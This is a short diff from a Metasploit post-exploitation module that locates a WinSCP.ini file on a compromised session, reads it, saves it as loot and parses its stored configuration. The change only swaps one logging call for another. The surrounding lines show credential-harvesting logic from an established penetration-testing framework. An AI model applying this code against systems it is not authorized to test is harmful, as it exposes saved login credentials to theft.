@@ -143,7 +143,7 @@ class MetasploitModule < Msf::Post
     print_good("WinSCP.ini located at #{file_path}")
     file = read_file(file_path)
     stored_path = store_loot('winscp.ini', 'text/plain', session, file, 'WinSCP.ini', file_path)
-    print_status("WinSCP saved to loot: #{stored_path}")
+    print_good("WinSCP saved to loot: #{stored_path}")
     parse_ini(file).each do |res|
       winscp_store_config(res)
     end
